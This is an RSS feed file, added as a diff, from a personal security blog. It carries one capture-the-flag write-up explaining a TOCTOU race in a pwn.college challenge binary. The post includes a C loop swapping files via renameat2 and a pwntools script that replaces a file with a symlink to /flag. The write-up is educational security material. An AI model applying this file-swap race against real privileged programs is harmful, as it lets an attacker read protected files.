@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>TOCTOU on uint8_t* blog</title>
+    <link>https://blog.i-eat-sponges.ca/tags/toctou/</link>
+    <description>Recent content in TOCTOU on uint8_t* blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 11 Oct 2023 03:39:48 -0400</lastBuildDate><atom:link href="https://blog.i-eat-sponges.ca/tags/toctou/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>NAHM NAHM NAHM (Race Condition)</title>
+      <link>https://blog.i-eat-sponges.ca/exploitation/nahmnahmnahm/</link>
+      <pubDate>Wed, 11 Oct 2023 03:39:48 -0400</pubDate>
+      
+      <guid>https://blog.i-eat-sponges.ca/exploitation/nahmnahmnahm/</guid>
+      <description>NAHM NAHM NAHM, this challenge was the first pwn challenge after finishing the race conditions module on pwn.college, which funnily enough turned out to be a race condition too !
+Taking a look at the Challenge Executing the challenge, the programs asks us for a file and output it&amp;rsquo;s content to the stdout.
+❯ ./nahmnahmnahm Enter file: shell Press enter to continue: Hello from File Looking at the executable in Binary Ninja, we can clearly notice the vulnerability.</description>
+      <content>&lt;p&gt;NAHM NAHM NAHM, this challenge was the first pwn challenge after finishing the race conditions module on &lt;strong&gt;pwn.college&lt;/strong&gt;, which funnily enough turned out to be a race condition too !&lt;/p&gt;
+&lt;h2 id=&#34;taking-a-look-at-the-challenge&#34;&gt;Taking a look at the Challenge&lt;/h2&gt;
+&lt;p&gt;Executing the challenge, the programs asks us for a file and output it&amp;rsquo;s content to the stdout.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;❯ ./nahmnahmnahm
+Enter file: shell
+Press enter to continue:
+
+Hello from File
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the executable in Binary Ninja, we can clearly notice the vulnerability.&lt;/p&gt;
+&lt;p&gt;We are performing checks on the file before actually opening and using it. We can abuse this by swapping the file with another one, in-between the check and the use of the file.&lt;/p&gt;
+&lt;p&gt;This is very easily done using the &lt;strong&gt;renameat2&lt;/strong&gt; syscall using the &lt;strong&gt;RENAME_EXCHANGE&lt;/strong&gt; flag, this syscall will allow us to exchange the name of a file with the name of another one. Running this in a while loop and we can win the race and get the flag.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;sys/syscall.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;linux/fs.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;argv){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;(SYS_renameat2, AT_FDCWD, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], AT_FDCWD, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], RENAME_EXCHANGE);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;HOWEVER&lt;/strong&gt;, since this challenge is super easy and there&amp;rsquo;s even a time where the program stops until we press enter.&lt;/p&gt;
+&lt;p&gt;This gives us plenty of time to swap the file, let&amp;rsquo;s write a python script to solve this challenge.&lt;/p&gt;
+&lt;h1 id=&#34;python-script-to-win&#34;&gt;Python Script to Win&lt;/h1&gt;
+&lt;p&gt;I wrote the following python script to let us win the challenge every single time. Here we&amp;rsquo;re introducing sleep just in case our script tries to swap the files too fast !&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; time
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;amd64&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exe &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ELF(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./nahmnahmnahm&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unlink(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;evil_file&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;can&amp;#39;t remove_file evil_file&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exists(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;evil_file&amp;#34;&lt;/span&gt;):
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;¦&lt;/span&gt;   print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;However file seems to exists ?...&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;¦&lt;/span&gt;   exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;evil_file&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; file:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Nothing sus going on here...&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    file&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;process(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./nahmnahmnahm&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;evil_file&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.05&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unlink(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;evil_file&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symlink(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/flag&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;evil_file&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content>
+    </item>
+    
+  </channel>
+</rss>
